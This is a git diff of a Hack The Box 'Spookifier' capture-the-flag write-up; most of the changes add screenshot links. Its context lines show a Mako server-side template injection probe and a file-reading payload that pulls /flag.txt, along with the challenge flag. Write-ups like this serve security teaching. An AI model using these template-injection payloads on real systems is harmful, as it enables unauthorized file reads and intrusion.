@@ -10,6 +10,7 @@ language: "en"
 translationKey: "hack-the-box/spookifier"
 draft: false
 featured: false
+cover: "/images/spookifier/spookifier-05.png"
 ---
 
 > This write-up was conducted in a controlled lab environment. Only apply the techniques below on systems you are authorized to test.
@@ -34,17 +35,23 @@ The home page accepts input through the `text` query parameter:
 http://154.57.164.73:31608/?text=abc
 ```
 
+![Spookifier page with abc as the input](/images/spookifier/spookifier-01.png)
+
 The value is displayed again in several fonts. User input flowing directly through the URL and being rendered multiple times is a useful signal to test for SSTI.
 
 ## Source Code Analysis
 
 The source shows that the application uses Mako:
 
+![Source code importing Mako and creating a template](/images/spookifier/spookifier-02.png)
+
 ```python
 from mako.template import Template
 ```
 
 In `routes.py`, request data is passed to `spookify` and then into the template:
+
+![Route reading the text parameter and calling spookify](/images/spookifier/spookifier-03.png)
 
 ```python
 text = request.args.get('text')
@@ -73,6 +80,8 @@ http://154.57.164.73:31608/?text=${7*7}
 
 The page renders `49`. This confirms that `${...}` is processed by Mako instead of being displayed as plain text.
 
+![49 rendered after testing the SSTI expression](/images/spookifier/spookifier-04.png)
+
 ### 2. Read the flag
 
 Mako exposes `open` in the challenge context. The file-reading payload is:
@@ -88,6 +97,8 @@ http://154.57.164.73:31608/?text=${open(%27/flag.txt%27).read()}
 ```
 
 The response contains:
+
+![Flag returned by the file-reading payload](/images/spookifier/spookifier-05.png)
 
 ```text
 HTB{t3mp1at3_1nj3ct10n_c4n_3x1s+5_4nywh3r3!}
